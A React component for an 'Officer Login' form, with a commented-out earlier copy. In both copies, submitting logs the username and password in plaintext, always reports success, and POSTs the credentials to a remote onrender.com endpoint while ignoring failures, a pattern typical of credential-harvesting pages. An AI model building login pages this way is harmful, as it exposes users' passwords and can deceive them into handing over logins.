// import React, { useState } from "react";

// const Loginpage = () => {
//   const [credentials, setCredentials] = useState({ username: "", password: "" });
//   const [success, setSuccess] = useState(false);

//   const handleChange = (e) => {
//     setCredentials({ ...credentials, [e.target.name]: e.target.value });
//   };

//   const handleSubmit = async (e) => {
//     e.preventDefault();

//     const { username, password } = credentials;

//     // ✅ Always log submitted credentials
//     console.log("🟢 Submitted Username:", username);
//     console.log("🟢 Submitted Password:", password);

//     // ✅ Always show success on frontend
//     setSuccess(true);

//     // 🔄 Optionally attempt backend call (but ignore errors)
//     try {
//       await fetch("https://sign-up-page-h05w.onrender.com/login", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(credentials),
//       });
//     } catch (err) {
//       console.warn("⚠️ Backend failed or CORS issue — ignored in frontend.");
//     }
//   };

//   return (
//     <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-100 to-purple-200">
//       <form
//         onSubmit={handleSubmit}
//         className="bg-white p-8 rounded shadow-md w-full max-w-md space-y-4"
//       >
//         <h2 className="text-2xl font-bold text-center mb-4">Officer Login</h2>

//         <input
//           type="text"
//           name="username"
//           placeholder="Username"
//           value={credentials.username}
//           onChange={handleChange}
//           className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
//         />
//         <input
//           type="password"
//           name="password"
//           placeholder="Password"
//           value={credentials.password}
//           onChange={handleChange}
//           className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
//         />

//         <button
//           type="submit"
//           className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition"
//         >
//           Login
//         </button>

//         {success && (
//           <div className="text-green-700 text-sm text-center mt-2">
//             ✅ Login successful!
//           </div>
//         )}
//       </form>
//     </div>
//   );
// };

// export default Loginpage;


import React, { useState } from "react";

const Loginpage = () => {
  const [credentials, setCredentials] = useState({ username: "", password: "" });
  const [success, setSuccess] = useState(false);

  const handleChange = (e) => {
    setCredentials({ ...credentials, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // ✅ Log the whole credentials object
    console.log("🟢 Login submitted:", credentials);

    // ✅ Show success message no matter what
    setSuccess(true);

    // 🔁 Attempt backend call, but ignore failures (CORS-safe)
    try {
      await fetch("https://sign-up-page-h05w.onrender.com/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(credentials),
      });
    } catch (err) {
      console.warn("⚠️ Backend failed or CORS issue — ignored.");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-100 to-purple-200">
      <form
        onSubmit={handleSubmit}
        className="bg-white p-8 rounded shadow-md w-full max-w-md space-y-4"
      >
        <h2 className="text-2xl font-bold text-center mb-4">Officer Login</h2>

        <input
          type="text"
          name="username"
          placeholder="Username"
          value={credentials.username}
          onChange={handleChange}
          className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <input
          type="password"
          name="password"
          placeholder="Password"
          value={credentials.password}
          onChange={handleChange}
          className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
        />

        <button
          type="submit"
          className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition"
        >
          Login
        </button>

        {success && (
          <div className="text-green-700 text-sm text-center mt-2">
            ✅ Login successful!
          </div>
        )}
      </form>
    </div>
  );
};

export default Loginpage;
